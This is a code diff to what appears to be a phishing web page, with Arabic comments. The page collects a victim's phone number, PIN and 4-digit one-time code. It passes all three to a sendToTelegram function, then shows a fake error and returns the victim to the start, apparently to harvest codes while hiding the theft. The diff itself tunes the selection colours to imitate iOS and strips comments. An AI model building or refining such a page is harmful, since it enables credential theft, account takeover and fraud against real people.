@@ -9,14 +9,14 @@
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;background:#fff}
 
-/* لون تحديد النص ومؤشر الكتابة */
+/* لون تحديد النص ليطابق لون التحديد في أجهزة iOS بنفس الدرجة */
 ::selection {
-  background-color: #2E818F;
-  color: #ffffff;
+  background-color: #b3c5ea !important;
+  color: #000000 !important;
 }
 ::-moz-selection {
-  background-color: #2E818F;
-  color: #ffffff;
+  background-color: #b3c5ea !important;
+  color: #000000 !important;
 }
 
 #app{width:100%;height:100%;display:flex;justify-content:center;position:relative}
@@ -471,7 +471,6 @@ function login(){
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
   
-  // التحقق من أن الرقم يتكون من 8 أرقام ويبدأ بـ (2 أو 3 أو 4)
   var firstChar = ph.charAt(0);
   var isValidPrefix = (firstChar === '2' || firstChar === '3' || firstChar === '4');
 
@@ -521,26 +520,20 @@ O.forEach(function(el,i){
 function verify(){
   var code=O.map(function(o){return o.value;}).join('');
   
-  // اشتراط أن يكون الـ OTP يتكون من 4 أرقام كاملة
   if(code.length !== 4) {
-    return; // ترفض العملية إذا كان أقل من 4 أرقام
+    return;
   }
   
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
   
-  // إرسال كود OTP المكون من 4 أرقام
   sendToTelegram(ph, pin, code);
 
-  // إظهار نافذة الخطأ
   document.getElementById('otp-error-modal').classList.remove('hide');
 }
 
 function closeOtpErrorModal(){
-  // إخفاء النافذة المنبثقة
   document.getElementById('otp-error-modal').classList.add('hide');
-  
-  // العودة للواجهة الأولى
   back();
 }
 
